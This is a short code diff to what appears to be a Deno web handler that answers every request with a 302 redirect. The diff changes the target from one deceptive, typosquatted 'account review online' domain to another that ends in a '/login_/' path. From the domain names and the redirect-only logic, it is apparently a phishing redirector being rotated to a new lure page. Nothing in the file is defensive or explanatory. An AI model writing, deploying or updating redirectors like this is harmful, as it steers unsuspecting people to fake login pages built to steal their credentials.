@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://ac0untrevlewnowonline.icu/pima/",
+      Location: "https://burhertvertacctonline.info/burkhe/login_/",
     },
   });
 });
